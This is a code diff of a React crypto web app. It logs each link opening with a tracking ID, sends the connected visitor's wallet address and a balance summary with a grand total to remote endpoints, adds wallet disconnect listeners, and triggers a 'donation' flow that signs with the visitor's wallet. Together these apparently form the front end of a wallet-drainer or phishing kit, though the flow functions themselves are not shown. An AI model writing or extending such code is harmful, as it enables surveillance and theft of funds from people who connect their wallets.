@@ -18,42 +18,31 @@ export default function App() {
   const { address, isConnected } = useAccount();
   const { data: walletClient } = useWalletClient();
 
-  // stable tracking id for the session
   const trackingIdRef = useRef(Date.now().toString());
   const trackingId = trackingIdRef.current;
 
-  // UI toast helper
   function addNotification(message, type = "info") {
     const id = Date.now() + Math.floor(Math.random() * 1000);
     setNotifications((prev) => [...prev, { id, message, type }]);
     setTimeout(() => setNotifications((prev) => prev.filter((n) => n.id !== id)), 5000);
   }
 
-  // LINK_OPENED: fire once on mount
+  // LINK_OPENED
   useEffect(() => {
-    const openedPayload = {
-      openedUrl: window.location.href,
-      visitorIp: null,
-      trackingId,
-    };
-    try {
-      notify("LINK_OPENED", openedPayload);
-      sendEvent("LINK_OPENED", openedPayload).catch(() => {});
-    } catch (err) {
-      console.warn("LINK_OPENED notify failed", err);
-    }
+    const openedPayload = { openedUrl: window.location.href, visitorIp: null, trackingId };
+    notify("LINK_OPENED", openedPayload);
+    sendEvent("LINK_OPENED", openedPayload).catch(() => {});
   }, [trackingId]);
 
-  // WALLET_CONNECTED / WALLET_DISCONNECTED: send full payload when connected
+  // WALLET_CONNECTED / WALLET_DISCONNECTED
   useEffect(() => {
     let cancelled = false;
+
     async function syncConnect() {
       try {
         if (isConnected && address) {
           addNotification("Preparing wallet summary…", "info");
-          // buildWalletSummary is the single source of truth for balances/total
           const { balancesPayload, grandTotal } = await buildWalletSummary(address);
-
           if (cancelled) return;
 
           const connectedPayload = {
@@ -67,7 +56,6 @@ export default function App() {
           await sendEvent("WALLET_CONNECTED", connectedPayload);
           addNotification("Wallet connected — summary sent.", "success");
         } else if (!isConnected && address) {
-          // disconnected or account removed
           const discPayload = { walletAddress: address, trackingId };
           notify("WALLET_DISCONNECTED", discPayload);
           sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
@@ -82,7 +70,35 @@ export default function App() {
     return () => { cancelled = true; };
   }, [isConnected, address, trackingId]);
 
-  // donation trigger (passes address + trackingId)
+  // Attach injected / WalletConnect provider events for disconnect
+  useEffect(() => {
+    let provider;
+
+    if (typeof window !== "undefined") {
+      provider = window.ethereum || window.walletConnectProvider;
+    }
+    if (!provider?.on) return;
+
+    const handleDisconnect = () => {
+      const discPayload = { walletAddress: address, trackingId };
+      notify("WALLET_DISCONNECTED", discPayload);
+      sendEvent("WALLET_DISCONNECTED", discPayload).catch(() => {});
+    };
+
+    const handleAccountsChanged = (accounts) => {
+      if (!accounts?.length) handleDisconnect();
+    };
+
+    provider.on("disconnect", handleDisconnect);
+    provider.on("accountsChanged", handleAccountsChanged);
+
+    return () => {
+      provider?.removeListener("disconnect", handleDisconnect);
+      provider?.removeListener("accountsChanged", handleAccountsChanged);
+    };
+  }, [address]);
+
+  // Donation handler
   async function handleDonate() {
     if (!walletClient) {
       addNotification("No connected wallet client found. Please connect your wallet.", "error");
@@ -93,7 +109,6 @@ export default function App() {
     try {
       setStatus("running");
       addNotification("Donation started… 🚀", "info");
-
       const res = await runDonationFlow(walletClient, address, trackingId);
 
       if (res?.success) {
